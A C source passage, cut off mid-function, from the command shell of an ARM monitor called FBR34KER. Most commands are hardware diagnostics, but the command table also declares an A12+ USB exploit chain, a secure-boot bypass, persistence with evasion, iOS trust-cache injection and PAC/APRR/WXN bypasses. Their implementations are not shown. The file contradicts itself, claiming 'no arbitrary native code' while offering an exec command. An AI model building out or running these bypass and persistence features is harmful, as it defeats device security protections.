#include "fbr34ker/command.h"
#include "fbr34ker/allocator.h"
#include "fbr34ker/architecture.h"
#include "fbr34ker/physical_memory.h"
#include "fbr34ker/mmio.h"
#include "fbr34ker/bringup_report.h"
#include "fbr34ker/boot_evidence.h"
#include "fbr34ker/board.h"
#include "fbr34ker/build_info.h"
#include "fbr34ker/bringup.h"
#include "fbr34ker/console.h"
#include "fbr34ker/crash.h"
#include "fbr34ker/device_tree.h"
#include "fbr34ker/driver.h"
#include "fbr34ker/event.h"
#include "fbr34ker/fault.h"
#include "fbr34ker/exception.h"
#include "fbr34ker/format.h"
#include "fbr34ker/handoff.h"
#include "fbr34ker/hardware_probe.h"
#include "fbr34ker/kernel_patches.h"
#include "fbr34ker/secure_boot_bypass.h"
#include "fbr34ker/persistence.h"
#include "fbr34ker/trust_cache.h"
#include "fbr34ker/jailbreak.h"
#include "fbr34ker/log.h"
#include "fbr34ker/interrupt.h"
#include "fbr34ker/lifecycle.h"
#include "fbr34ker/module.h"
#include "fbr34ker/platform.h"
#include "fbr34ker/protocol.h"
#include "fbr34ker/stack_guard.h"
#include "fbr34ker/string.h"
#include "fbr34ker/timer.h"
#include "fbr34ker/trace.h"
#include "fbr34ker/version.h"
#include "fbr34ker/watchdog.h"
#include "fbr34ker/framebuffer_console.h"
#include "fbr34ker/service_guard.h"
#include "fbr34ker/service_registry.h"
#include "fbr34ker/usbliter8_exploit.h"
#include "fbr34ker/usb.h"

#define SHELL_LINE_CAPACITY 160U
#define SHELL_MAX_ARGUMENTS 10U
#define MODULE_UPLOAD_IDLE_TIMEOUT_MS 30000ULL

typedef int (*command_handler_t)(int argument_count, char **arguments);

typedef struct {
    const char *name;
    const char *usage;
    const char *description;
    command_handler_t handler;
} command_entry_t;

static ALIGNED(16) u8 module_upload_buffer[FBR34KER_MODULE_MAX_CONTAINER_SIZE];
static char console_history_snapshot[CONSOLE_HISTORY_CAPACITY + 1U];

static int command_help(int argument_count, char **arguments);
static int command_version(int argument_count, char **arguments);
static int command_architecture(int argument_count, char **arguments);
static int command_board_info(int argument_count, char **arguments);
static int command_board_json(int argument_count, char **arguments);
static int command_mmio_map(int argument_count, char **arguments);
static int command_physical_memory(int argument_count, char **arguments);
static int command_bringup_report_show(int argument_count, char **arguments);
static int command_bringup_report_json(int argument_count, char **arguments);
static int command_boot_evidence_show(int argument_count, char **arguments);
static int command_boot_evidence_json(int argument_count, char **arguments);
static int command_components(int argument_count, char **arguments);
static int command_service_registry(int argument_count, char **arguments);
static int command_drivers(int argument_count, char **arguments);
static int command_events(int argument_count, char **arguments);
static int command_trace(int argument_count, char **arguments);
static int command_trace_json(int argument_count, char **arguments);
static int command_fault_status(int argument_count, char **arguments);
static int command_info(int argument_count, char **arguments);
static int command_exception_level(int argument_count, char **arguments);
static int command_system_registers(int argument_count, char **arguments);
static int command_timer_frequency(int argument_count, char **arguments);
static int command_boot_modules(int argument_count, char **arguments);
static int command_probe_status(int argument_count, char **arguments);
static int command_probe_validate(int argument_count, char **arguments);
static int command_compatibility(int argument_count, char **arguments);
static int command_handoff(int argument_count, char **arguments);
static int command_bringup_status(int argument_count, char **arguments);
static int command_bringup_enter(int argument_count, char **arguments);
static int command_bringup_exit(int argument_count, char **arguments);
static int command_console_test(int argument_count, char **arguments);
static int command_console_history(int argument_count, char **arguments);
static int command_console_transports(int argument_count, char **arguments);
static int command_console_semihosting(int argument_count, char **arguments);
static int command_timer_test(int argument_count, char **arguments);
static int command_irq_test(int argument_count, char **arguments);
static int command_memory_check(int argument_count, char **arguments);
static int command_uptime(int argument_count, char **arguments);
static int command_regions(int argument_count, char **arguments);
static int command_heap(int argument_count, char **arguments);
static int command_log(int argument_count, char **arguments);
static int command_dt_info(int argument_count, char **arguments);
static int command_dt_node(int argument_count, char **arguments);
static int command_dt_find(int argument_count, char **arguments);
static int command_dt_property(int argument_count, char **arguments);
static int command_dt_compatible(int argument_count, char **arguments);
static int command_dt_reg(int argument_count, char **arguments);
static int command_dt_alias(int argument_count, char **arguments);
static int command_dt_stdout(int argument_count, char **arguments);
static int command_dt_cells(int argument_count, char **arguments);
static int command_dt_clock(int argument_count, char **arguments);
static int command_dt_interrupts(int argument_count, char **arguments);
static int command_dt_clocks(int argument_count, char **arguments);
static int command_platform_features(int argument_count, char **arguments);
static int command_service_health(int argument_count, char **arguments);
static int command_display_info(int argument_count, char **arguments);
static int command_display_clear(int argument_count, char **arguments);
static int command_display_console(int argument_count, char **arguments);
static int command_display_test(int argument_count, char **arguments);
static int command_irq_info(int argument_count, char **arguments);
static int command_irq_enable(int argument_count, char **arguments);
static int command_irq_disable(int argument_count, char **arguments);
static int command_irq_selftest(int argument_count, char **arguments);
static int command_platform_selftest(int argument_count, char **arguments);
static int command_watchdog_info(int argument_count, char **arguments);
static int command_watchdog_arm(int argument_count, char **arguments);
static int command_watchdog_pet(int argument_count, char **arguments);
static int command_watchdog_disarm(int argument_count, char **arguments);
static int command_watchdog_test(int argument_count, char **arguments);
static int command_module_policy(int argument_count, char **arguments);
static int command_crash_show(int argument_count, char **arguments);
static int command_crash_clear(int argument_count, char **arguments);
static int command_crash_json(int argument_count, char **arguments);
static int command_health(int argument_count, char **arguments);
static int command_modules(int argument_count, char **arguments);
static int command_module_info(int argument_count, char **arguments);
static int command_module_load(int argument_count, char **arguments);
static int command_module_run(int argument_count, char **arguments);
static int command_module_unload(int argument_count, char **arguments);
static int command_echo(int argument_count, char **arguments);
static int command_clear(int argument_count, char **arguments);
static int command_reboot(int argument_count, char **arguments);
static int command_halt(int argument_count, char **arguments);
#ifdef FBR34KER_ENABLE_TEST_COMMANDS
static int command_fault_arm(int argument_count, char **arguments);
static int command_fault_clear(int argument_count, char **arguments);
static int command_architecture_restart(int argument_count, char **arguments);
static int command_test_crash(int argument_count, char **arguments);
#endif

static int command_kernel_patches(int argument_count, char **arguments);
static int command_secure_boot_bypass(int argument_count, char **arguments);
static int command_persistence(int argument_count, char **arguments);
static int command_exploit_chain(int argument_count, char **arguments);
static int command_exploit_status(int argument_count, char **arguments);
static int command_usb_status(int argument_count, char **arguments);
static int command_trust_cache(int argument_count, char **arguments);
static int command_jailbreak(int argument_count, char **arguments);

static const command_entry_t commands[] = {
    {"help",          "help",                 "List available commands.", command_help},
    {"version",       "version",              "Show build version.", command_version},
    {"architecture",  "architecture",         "Show runtime architecture health and capacity.", command_architecture},
    {"board-info",    "board-info",            "Show the selected board description and devices.", command_board_info},
    {"hardware-inventory", "hardware-inventory [probe acknowledge]", "Show hardware inventory or run guarded read-only probes.", command_board_info},
    {"board-json",    "board-json",            "Export the board description as JSON.", command_board_json},
    {"mmio-map",      "mmio-map",              "Show allow-listed MMIO windows and access statistics.", command_mmio_map},
    {"physical-memory", "physical-memory",      "Show physical page ownership and allocations.", command_physical_memory},
    {"bringup-report", "bringup-report [refresh]", "Show staged hardware bring-up diagnostics.", command_bringup_report_show},
    {"bringup-json",  "bringup-json",           "Export staged bring-up diagnostics as JSON.", command_bringup_report_json},
    {"boot-evidence", "boot-evidence",          "Show persistent boot-stage evidence.", command_boot_evidence_show},
    {"boot-evidence-json", "boot-evidence-json", "Export persistent boot evidence as JSON.", command_boot_evidence_json},
    {"components",    "components",           "List lifecycle components and dependencies.", command_components},
    {"service-registry", "service-registry",  "List typed runtime services and state.", command_service_registry},
    {"drivers",       "drivers",              "List dependency-aware platform drivers.", command_drivers},
    {"events",        "events",               "Print the bounded runtime event journal.", command_events},
    {"trace",         "trace",                "Print structured runtime trace records.", command_trace},
    {"trace-json",    "trace-json",           "Export structured trace records as JSON.", command_trace_json},
    {"fault-status",  "fault-status",         "Show deterministic fault-injection state.", command_fault_status},
    {"info",          "info",                 "Show CPU and platform information.", command_info},
    {"exception-level", "exception-level",     "Show the current ARM exception level.", command_exception_level},
    {"system-registers", "system-registers",   "Show a read-only architectural register snapshot.", command_system_registers},
    {"timer-frequency", "timer-frequency",     "Show the architectural timer frequency.", command_timer_frequency},
    {"handoff",       "handoff",              "Show loader handoff information.", command_handoff},
    {"handoff-info",  "handoff-info",         "Show loader handoff information.", command_handoff},
    {"boot-modules",  "boot-modules",         "List loader-provided boot-module metadata.", command_boot_modules},
    {"probe-status",  "probe-status",         "Show defensive physical-hardware policy.", command_probe_status},
    {"hardware-probe", "hardware-probe",       "Show defensive physical-hardware policy.", command_probe_status},
    {"probe-validate", "probe-validate <interrupts|framebuffer|watchdog|power> acknowledge", "Explicitly validate a guarded hardware service.", command_probe_validate},
    {"compatibility", "compatibility",         "Print the current hardware compatibility matrix.", command_compatibility},
    {"platform-info", "platform-info",        "Show CPU and platform information.", command_info},
    {"bringup-status","bringup-status",       "Show restricted hardware bring-up mode.", command_bringup_status},
    {"bringup-enter", "bringup-enter",        "Enter the restricted diagnostic shell.", command_bringup_enter},
    {"bringup-exit",  "bringup-exit unlock",  "Leave restricted mode after explicit acknowledgement.", command_bringup_exit},
    {"console-test",  "console-test",         "Exercise console output and flush services.", command_console_test},
    {"console-history", "console-history",     "Print the memory-backed console ring.", command_console_history},
    {"console-transports", "console-transports", "Show active console transports.", command_console_transports},
    {"console-semihosting", "console-semihosting <on|off>", "Mirror output through QEMU semihosting.", command_console_semihosting},
    {"timer-test",    "timer-test [ms]",      "Check timer monotonicity and elapsed time.", command_timer_test},
    {"memory-check",  "memory-check",         "Validate the granted memory-map layout.", command_memory_check},
    {"uptime",        "uptime",               "Show monitor uptime.", command_uptime},
    {"regions",       "regions",              "Show the platform memory map.", command_regions},
    {"memory-map",    "memory-map",           "Show the platform memory map.", command_regions},
    {"heap",          "heap",                 "Show allocator statistics.", command_heap},
    {"log",           "log",                  "Print the in-memory log ring.", command_log},
    {"dt-info",       "dt-info",              "Summarize the active flattened device tree.", command_dt_info},
    {"device-tree-summary", "device-tree-summary", "Summarize the active flattened device tree.", command_dt_info},
    {"dt-node",       "dt-node <path>",       "List a device-tree node.", command_dt_node},
    {"dt-find",       "dt-find <term>",       "Find device-tree nodes and properties.", command_dt_find},
    {"dt-property",   "dt-property <path> <property>", "Print a device-tree property.", command_dt_property},
    {"dt-compatible", "dt-compatible <string>", "Find nodes with an exact compatible string.", command_dt_compatible},
    {"dt-reg",        "dt-reg <path> [index]", "Decode a node's inherited-cell reg entry.", command_dt_reg},
    {"dt-alias",      "dt-alias <name>",      "Resolve an /aliases entry.", command_dt_alias},
    {"dt-stdout",     "dt-stdout",             "Resolve the /chosen stdout path.", command_dt_stdout},
    {"dt-cells",      "dt-cells <path> <property>", "Decode a property as big-endian cells.", command_dt_cells},
    {"dt-clock",      "dt-clock <path>",       "Decode a node clock-frequency property.", command_dt_clock},
    {"dt-interrupts", "dt-interrupts <path>",  "Decode a node interrupts property as cells.", command_dt_interrupts},
    {"dt-clocks",     "dt-clocks <path>",      "Decode a node clocks property as cells.", command_dt_clocks},
    {"platform-features", "platform-features", "Show portable loader/platform services.", command_platform_features},
    {"services",      "services",             "Show portable loader/platform services.", command_platform_features},
    {"service-health", "service-health",        "Show guarded callback health and disable state.", command_service_health},
    {"console-services", "console-services",   "Show console transport and fallback status.", command_console_transports},
    {"display-info",  "display-info",          "Show validated framebuffer information.", command_display_info},
    {"framebuffer-info", "framebuffer-info",   "Show validated framebuffer information.", command_display_info},
    {"display-clear", "display-clear <color>", "Clear the validated framebuffer (RRGGBB).", command_display_clear},
    {"display-console", "display-console <status|on|off>", "Control the framebuffer text console.", command_display_console},
    {"display-test",  "display-test",           "Render a framebuffer text/scrolling test.", command_display_test},
    {"irq-info",      "irq-info",              "Show interrupt-controller statistics.", command_irq_info},
    {"irq-controller", "irq-controller",       "Show interrupt-controller statistics.", command_irq_info},
    {"irq-test",      "irq-test <id>",        "Probe loader IRQ enable/disable callbacks.", command_irq_test},
    {"irq-enable",    "irq-enable",            "Enable IRQ delivery when a controller is available.", command_irq_enable},
    {"irq-disable",   "irq-disable",           "Mask IRQ delivery.", command_irq_disable},
    {"irq-selftest",  "irq-selftest",          "Run a reversible controller register test.", command_irq_selftest},
    {"platform-selftest", "platform-selftest",  "Run safe console/timer/IRQ/framebuffer checks.", command_platform_selftest},
    {"watchdog-info", "watchdog-info",         "Show watchdog service state.", command_watchdog_info},
    {"watchdog-services", "watchdog-services", "Show watchdog service state.", command_watchdog_info},
    {"watchdog-arm",  "watchdog-arm <ms>",     "Arm a loader watchdog between 100 ms and 10 minutes.", command_watchdog_arm},
    {"watchdog-pet",  "watchdog-pet",          "Kick the loader watchdog once.", command_watchdog_pet},
    {"watchdog-disarm", "watchdog-disarm",      "Disable the loader watchdog.", command_watchdog_disarm},
    {"watchdog-test", "watchdog-test",          "Run a reversible watchdog callback test.", command_watchdog_test},
    {"module-policy", "module-policy",         "Show the active FMBC capability and quota policy.", command_module_policy},
    {"crash-show",    "crash-show",           "Print the preserved crash report.", command_crash_show},
    {"crash-clear",   "crash-clear",          "Clear the preserved crash report.", command_crash_clear},
    {"crash-json",    "crash-json",           "Export the preserved crash report as JSON.", command_crash_json},
    {"health",        "health",               "Check heap red zones and stack guards.", command_health},
    {"modules",       "modules",              "List built-in and dynamic modules.", command_modules},
    {"module-info",   "module-info <name>",   "Describe a module.", command_module_info},
    {"module-load",   "module-load <bytes>",  "Receive an FMOD container as raw bytes.", command_module_load},
    {"module-run",    "module-run <name>",    "Execute a loaded bytecode module.", command_module_run},
    {"module-unload", "module-unload <name>", "Unload a dynamic module.", command_module_unload},
    {"echo",          "echo [text...]",       "Print text to the console.", command_echo},
    {"clear",         "clear",                "Clear an ANSI-compatible terminal.", command_clear},
    {"reboot",        "reboot",               "Request a PSCI system reset.", command_reboot},
    {"halt",          "halt",                 "Request a PSCI system shutdown.", command_halt},
    {"kernel-patches","kernel-patches [status|apply|revert|escalate]", "Inspect kernel patch subsystem state and apply patches.", command_kernel_patches},
    {"secure-boot-bypass", "secure-boot-bypass [status|activate|forgive|manifest]", "Inspect secure boot bypass subsystem state.", command_secure_boot_bypass},
    {"persistence",   "persistence [status|deploy|activate|evade]", "Inspect persistence subsystem state and deploy hooks.", command_persistence},
    {"trust-cache",   "trust-cache [status|find|inject]", "Inject trust cache entries into the iOS kernel.", command_trust_cache},
    {"jailbreak",     "jailbreak [status|security-model <on|off>|bypass-pac|bypass-aprr|bypass-wxn|bypass-all|detect-kernel|detect-kaslr|inject-bootargs [--args <str>]|detect-sep|chain-all|boot-kernel]", "A12+ security bypass and kernel boot chain.", command_jailbreak},
    {"exploit-chain", "exploit-chain [status|run [cpid]|pwndfu [cpid]|load <addr> <size>|dfu-load [addr]|exec [entry]|reset]", "USBliter8 exploit chain for A12+.", command_exploit_chain},
    {"exploit-status","exploit-status",         "Show security-model status.", command_exploit_status},
    {"usb-status",    "usb-status",             "Show USB controller and DFU status.", command_usb_status},
#ifdef FBR34KER_ENABLE_TEST_COMMANDS
    {"fault-arm",     "fault-arm <point> [after] [count] [source]", "Arm a deterministic integration-test failpoint.", command_fault_arm},
    {"fault-clear",   "fault-clear",           "Disarm deterministic fault injection.", command_fault_clear},
    {"architecture-restart", "architecture-restart", "Restart the architecture transaction for validation.", command_architecture_restart},
    {"test-crash",    "test-crash",           "Trigger a BRK exception for integration testing.", command_test_crash},
#endif
};

static const char *region_type_name(memory_region_type_t type)
{
    switch (type) {
    case MEMORY_REGION_USABLE: return "usable";
    case MEMORY_REGION_RESERVED: return "reserved";
    case MEMORY_REGION_MMIO: return "mmio";
    case MEMORY_REGION_MONITOR: return "monitor";
    case MEMORY_REGION_FRAMEBUFFER: return "framebuffer";
    default: return "unknown";
    }
}

static bool parse_u64(const char *text, u64 *value)
{
    if (text == NULL || value == NULL || *text == '\0') {
        return false;
    }
    u64 result = 0U;
    u64 base = 10U;
    if (text[0] == '0' && (text[1] == 'x' || text[1] == 'X')) {
        base = 16U;
        text += 2;
        if (*text == '\0') {
            return false;
        }
    }
    while (*text != '\0') {
        u64 digit;
        if (*text >= '0' && *text <= '9') {
            digit = (u64)(*text - '0');
        } else if (base == 16U && *text >= 'a' && *text <= 'f') {
            digit = 10U + (u64)(*text - 'a');
        } else if (base == 16U && *text >= 'A' && *text <= 'F') {
            digit = 10U + (u64)(*text - 'A');
        } else {
            return false;
        }
        if (digit >= base || result > (U64_MAX_VALUE - digit) / base) {
            return false;
        }
        result = result * base + digit;
        ++text;
    }
    *value = result;
    return true;
}

static const char *capability_text(u32 capabilities)
{
    static char text[64];
    struct capability_name { u32 bit; const char *name; };
    static const struct capability_name names[] = {
        {FBR34KER_MODULE_CAP_CONSOLE, "console"},
        {FBR34KER_MODULE_CAP_LOG, "log"},
        {FBR34KER_MODULE_CAP_TIME, "time"},
        {FBR34KER_MODULE_CAP_DT, "dt"},
        {FBR34KER_MODULE_CAP_STATE, "state"},
        {FBR34KER_MODULE_CAP_HOST, "host"},
    };
    if (capabilities == 0U) return "none";
    usize offset = 0U;
    text[0] = '\0';
    for (usize index = 0U; index < ARRAY_COUNT(names); ++index) {
        if ((capabilities & names[index].bit) == 0U) continue;
        if (offset != 0U && offset + 1U < sizeof(text)) text[offset++] = ',';
        const usize length = fm_strlen(names[index].name);
        if (length >= sizeof(text) - offset) break;
        fm_memcpy(text + offset, names[index].name, length);
        offset += length;
        text[offset] = '\0';
    }
    return text;
}

static int command_help(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    usize available = 0U;
    fm_printf("FBR34KER Commands:\n");
    for (usize index = 0U; index < ARRAY_COUNT(commands); ++index) {
        if (!bringup_command_allowed(commands[index].name)) continue;
        ++available;
        fm_printf("  %-25s %s\n", commands[index].usage,
                  commands[index].description);
    }
    fm_printf("Total commands available: %zu\n", available);
    return 0;
}

static int command_version(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const fbr34ker_build_info_t *build = fbr34ker_build_info();
    fm_printf("%s %s (%s)\n", build->monitor_name, build->monitor_version,
              build->build_channel);
    fm_printf("Target: %s; source: %s\n", build->build_target,
              build->source_id);
    fm_printf("Protocol %u; handoff %u; module ABI %u; FMOD %u; FMBC %u\n",
              build->protocol_version, build->handoff_version,
              build->module_abi, build->module_format_version,
              build->bytecode_version);
    return 0;
}

static int command_architecture(int argument_count, char **arguments)
{
    UNUSED(arguments); if (argument_count != 1) { fm_printf("usage: architecture\n"); return -1; }
    const fbr34ker_event_stats_t stats=event_bus_stats();
    fm_printf("Runtime architecture: %s / %s\n",architecture_ready()?"ready":"not-ready",architecture_healthy()?"healthy":"degraded");
    fm_printf("Components: %llu; services: %llu; drivers: %llu\n",lifecycle_component_count(),service_registry_count(),driver_count());
    fm_printf("Capabilities: 0x%016llx\n",lifecycle_provided_capabilities());
    fm_printf("Events: %llu published; %u retained; %llu overwritten\n",stats.published,stats.journal_count,stats.overwritten);
    return architecture_healthy()?0:-1;
}
static int command_components(int argument_count, char **arguments)
{
    UNUSED(arguments); if(argument_count!=1){fm_printf("usage: components\n");return-1;}
    for(u64 i=0;i<lifecycle_component_count();++i){fbr34ker_component_info_t x;if(!lifecycle_component_info(i,&x))continue;fm_printf("%s: phase=%s state=%s health=%s\n",x.name,lifecycle_phase_name(x.phase),lifecycle_state_name(x.state),x.healthy?"ok":"failed");fm_printf("  requires=0x%016llx provides=0x%016llx missing=0x%016llx\n",x.requires,x.provides,x.missing);}return 0;
}
static int command_service_registry(int argument_count,char **arguments)
{
    UNUSED(arguments);if(argument_count!=1){fm_printf("usage: service-registry\n");return-1;}for(u64 i=0;i<service_registry_count();++i){fbr34ker_service_info_t x;if(!service_registry_at(i,&x))continue;fm_printf("%s v%u: %s owner=%s feature=0x%016llx transitions=%llu\n",x.name,x.version,service_state_name(x.state),x.owner,x.platform_feature,x.transitions);}return 0;
}
static int command_drivers(int argument_count,char **arguments)
{
    UNUSED(arguments);if(argument_count!=1){fm_printf("usage: drivers\n");return-1;}for(u64 i=0;i<driver_count();++i){fbr34ker_driver_info_t x;if(!driver_at(i,&x))continue;fm_printf("%s: %s owner=%s priority=%u features=0x%016llx\n",x.name,driver_state_name(x.state),x.owner,x.priority,x.required_features);fm_printf("  depends=%s provides=%s transitions=%llu\n",x.dependency_service[0]?x.dependency_service:"none",x.provided_service[0]?x.provided_service:"none",x.transitions);}return 0;
}
static int command_events(int argument_count,char **arguments)
{
    UNUSED(arguments);
    if(argument_count!=1){fm_printf("usage: events\n");return-1;}
    const fbr34ker_event_stats_t stats=event_bus_stats();
    fm_printf("Event journal: %u/%u retained; %llu published; %llu overwritten; %llu injected failures\n",
              stats.journal_count,FBR34KER_EVENT_JOURNAL_CAPACITY,stats.published,
              stats.overwritten,stats.injected_failures);
    for(u64 i=0;i<event_bus_count();++i){
        fbr34ker_event_t e;
        if(!event_bus_at(i,&e))continue;
        fm_printf("#%llu %s %s value0=%llu value1=%llu\n",e.sequence,
                  event_type_name(e.type),e.source,e.value0,e.value1);
    }
    return 0;
}

static int command_trace(int argument_count, char **arguments)
{
    UNUSED(arguments);
    if (argument_count != 1) { fm_printf("usage: trace\n"); return -1; }
    const fbr34ker_trace_stats_t stats = trace_stats();
    fm_printf("Trace journal: %u/%u retained; %llu emitted; %llu overwritten\n",
              stats.retained, FBR34KER_TRACE_CAPACITY, stats.emitted,
              stats.overwritten);
    for (u64 index = 0U; index < trace_count(); ++index) {
        fbr34ker_trace_record_t record;
        if (!trace_at(index, &record)) continue;
        fm_printf("#%llu %s action=%u status=%d %s value0=%llu value1=%llu\n",
                  record.sequence, trace_category_name(record.category),
                  record.action, record.status, record.source,
                  record.value0, record.value1);
    }
    return trace_ready() ? 0 : -1;
}

static int command_trace_json(int argument_count, char **arguments)
{
    UNUSED(arguments);
    if (argument_count != 1) { fm_printf("usage: trace-json\n"); return -1; }
    char output[8192];
    (void)trace_export_json(output, sizeof(output));
    fm_printf("%s", output);
    return trace_ready() ? 0 : -1;
}

static int command_fault_status(int argument_count, char **arguments)
{
    UNUSED(arguments);
    if (argument_count != 1) { fm_printf("usage: fault-status\n"); return -1; }
    const fbr34ker_fault_status_t state = fault_injection_status();
    fm_printf("Fault injection: %s; state=%s point=%s source=%s\n",
              fault_injection_available() ? "available" : "production-disabled",
              state.enabled ? "armed" : "idle", fault_point_name(state.point),
              state.source[0] != '\0' ? state.source : "any");
    fm_printf("after=%u remaining=%u checks=%llu injections=%llu\n",
              state.trigger_after, state.remaining, state.checks, state.injections);
    return 0;
}


static int command_board_info(int argument_count, char **arguments)
{
    bool active_probe = false;
    if (argument_count == 3 && fm_strcmp(arguments[1], "probe") == 0 &&
        fm_strcmp(arguments[2], "acknowledge") == 0) {
        active_probe = true;
    } else if (argument_count != 1) {
        fm_printf("usage: hardware-inventory [probe acknowledge]\n");
        return -1;
    }
    if (active_probe && hardware_probe_immutable()) {
        fm_printf("immutable probe image: active MMIO probing is blocked\n");
        return -1;
    }
    if (active_probe) (void)bringup_report_run(true);
    const fbr34ker_board_descriptor_t *board = board_active();
    if (board == NULL) {
        fm_printf("No board description is active.\n");
        return -1;
    }
    fm_printf("Board:       %s (%s)\n", board->name, board->identifier);
    fm_printf("Compatible:  %s\n", board->compatible);
    fm_printf("Source:      %s / %s\n", board_source_name(board->source),
              board->matched ? "matched" : "fallback");
    fm_printf("Memory:      0x%016llx + %llu bytes\n",
              board->memory_base, board->memory_size);
    fm_printf("Features:    0x%016llx\n", board->features);
    fm_printf("Devices (%u):\n", board->device_count);
    for (u32 index = 0U; index < board->device_count; ++index) {
        const fbr34ker_board_device_t *device = &board->devices[index];
        fm_printf("  [%u] %-20s %-22s base=0x%016llx size=0x%llx irq=%u flags=0x%02x\n",
                  index, device->name, board_device_type_name(device->type),
                  device->base, device->size, device->interrupt, device->flags);
    }
    if (active_probe) {
        const fbr34ker_bringup_summary_t result = bringup_report_summary();
        fm_printf("Active probe: passed=%u failed=%u skipped=%u blocked=%u\n",
                  result.passed, result.failed, result.skipped, result.blocked);
        return result.failed == 0U ? 0 : -1;
    }
    return board_healthy() ? 0 : -1;
}

static int command_board_json(int argument_count, char **arguments)
{
    UNUSED(arguments);
    if (argument_count != 1) { fm_printf("usage: board-json\n"); return -1; }
    char json[8192];
    (void)board_export_json(json, sizeof(json));
    fm_printf("%s", json);
    return board_ready() ? 0 : -1;
}

static int command_mmio_map(int argument_count, char **arguments)
{
    UNUSED(arguments);
    if (argument_count != 1) { fm_printf("usage: mmio-map\n"); return -1; }
    const fbr34ker_mmio_stats_t stats = mmio_stats();
    fm_printf("MMIO: %s / %s; windows=%u reads=%llu writes=%llu rejected=%llu backend_failures=%llu\n",
              stats.initialized ? "ready" : "not-ready",
              stats.immutable ? "immutable" : "guarded",
              stats.window_count, stats.reads, stats.writes, stats.rejected,
              stats.backend_failures);
    fm_printf("Contained probe faults: %llu\n", stats.contained_faults);
    for (u32 index = 0U; index < mmio_window_count(); ++index) {
        fbr34ker_mmio_window_t window;
        if (mmio_window_at(index, &window)) {
            fm_printf("  [%u] %-24s 0x%016llx..0x%016llx perms=%c%c%c widths=0x%x\n",
                      index, window.name, window.base,
                      window.base + window.size,
                      (window.permissions & FBR34KER_MMIO_READ) != 0U ? 'r' : '-',
                      (window.permissions & FBR34KER_MMIO_WRITE) != 0U ? 'w' : '-',
                      (window.permissions & FBR34KER_MMIO_PROBE_SAFE) != 0U ? 'p' : '-',
                      window.access_width_mask);
        }
    }
    return mmio_healthy() ? 0 : -1;
}

static int command_physical_memory(int argument_count, char **arguments)
{
    UNUSED(arguments);
    if (argument_count != 1) { fm_printf("usage: physical-memory\n"); return -1; }
    const fbr34ker_pmm_stats_t stats = physical_memory_stats();
    fm_printf("Physical memory: %s usable=%llu reserved=%llu allocated=%llu free=%llu\n",
              stats.initialized ? "ready" : "not-ready", stats.usable_bytes,
              stats.reserved_bytes, stats.allocated_bytes, stats.free_bytes);
    fm_printf("Ranges: usable=%u reserved=%u active-allocations=%u failures=%llu/%llu\n",
              stats.usable_ranges, stats.reserved_ranges,
              stats.active_allocations, stats.allocation_failures,
              stats.allocation_attempts);
    fbr34ker_pmm_range_t range;
    for (u32 index = 0U; index < physical_memory_usable_count(); ++index) {
        if (physical_memory_usable_at(index, &range))
            fm_printf("  usable   0x%016llx + 0x%llx %s\n", range.base, range.size, range.tag);
    }
    for (u32 index = 0U; index < physical_memory_reserved_count(); ++index) {
        if (physical_memory_reserved_at(index, &range))
            fm_printf("  reserved 0x%016llx + 0x%llx %s\n", range.base, range.size, range.tag);
    }
    for (u32 index = 0U; index < physical_memory_allocation_count(); ++index) {
        if (physical_memory_allocation_at(index, &range))
            fm_printf("  allocated 0x%016llx + 0x%llx %s\n", range.base, range.size, range.tag);
    }
    return physical_memory_healthy() ? 0 : -1;
}

static int command_bringup_report_show(int argument_count, char **arguments)
{
    if (argument_count == 2 && fm_strcmp(arguments[1], "refresh") == 0) {
        (void)bringup_report_run(false);
    } else if (argument_count != 1) {
        fm_printf("usage: bringup-report [refresh]\n");
        return -1;
    }
    const fbr34ker_bringup_summary_t summary = bringup_report_summary();
    fm_printf("Bring-up report: complete=%s active=%s pass=%u fail=%u skip=%u blocked=%u\n",
              summary.complete ? "yes" : "no", summary.active_probe ? "yes" : "no",
              summary.passed, summary.failed, summary.skipped, summary.blocked);
    for (u32 index = 0U; index < bringup_report_count(); ++index) {
        fbr34ker_bringup_record_t record;
        if (bringup_report_at(index, &record)) {
            fm_printf("  [%u] %-24s %-8s %s (0x%llx,0x%llx)\n",
                      record.sequence, record.name,
                      bringup_status_name(record.status), record.detail,
                      record.value0, record.value1);
        }
    }
    return summary.complete && summary.failed == 0U ? 0 : -1;
}

static int command_bringup_report_json(int argument_count, char **arguments)
{
    UNUSED(arguments);
    if (argument_count != 1) { fm_printf("usage: bringup-json\n"); return -1; }
    char json[8192];
    (void)bringup_report_export_json(json, sizeof(json));
    fm_printf("%s", json);
    return bringup_report_summary().failed == 0U ? 0 : -1;
}

static int command_boot_evidence_show(int argument_count, char **arguments)
{
    UNUSED(arguments);
    if (argument_count != 1) { fm_printf("usage: boot-evidence\n"); return -1; }
    const fbr34ker_boot_evidence_t *record = boot_evidence_record();
    if (record == NULL) { fm_printf("No valid boot evidence.\n"); return -1; }
    fm_printf("Boot count:      %u\n", record->boot_count);
    fm_printf("Previous boot:   %s / %s\n",
              boot_stage_name((fbr34ker_boot_stage_t)record->previous_stage),
              record->previous_clean != 0U ? "clean" : "unclean");
    fm_printf("Current stage:   %s\n",
              boot_stage_name((fbr34ker_boot_stage_t)record->current_stage));
    fm_printf("Last error:      0x%08x value=0x%016llx\n",
              record->last_error, record->last_value);
    fm_printf("Stage sequence:  %llu\n", record->stage_sequence);
    return 0;
}

static int command_boot_evidence_json(int argument_count, char **arguments)
{
    UNUSED(arguments);
    if (argument_count != 1) { fm_printf("usage: boot-evidence-json\n"); return -1; }
    char json[1024];
    (void)boot_evidence_export_json(json, sizeof(json));
    fm_printf("%s", json);
    return boot_evidence_record() != NULL ? 0 : -1;
}

static int command_info(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    fm_printf("Platform:        %s\n", platform_name());
    fm_printf("Current EL:      EL%llu\n", cpu_current_el());
    fm_printf("Timer frequency: %llu Hz\n", timer_frequency());
    fm_printf("Module ABI:      %u\n", FBR34KER_MODULE_ABI);
    fm_printf("Dynamic runtime: validated FMBC v1/v2 bytecode\n");
    fm_printf("Host protocol:   framed v%u with CRC-32 and sequence ACKs\n", FBR34KER_PROTOCOL_VERSION);
    fm_printf("Device tree:     %s\n", device_tree_valid() ? "validated FDT active" : "not available");
    fm_printf("Security model:  capability-scoped; no arbitrary native code\n");
    return 0;
}

static int command_exception_level(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    fm_printf("EL%llu\n", cpu_current_el());
    return 0;
}

static int command_system_registers(int argument_count, char **arguments)
{
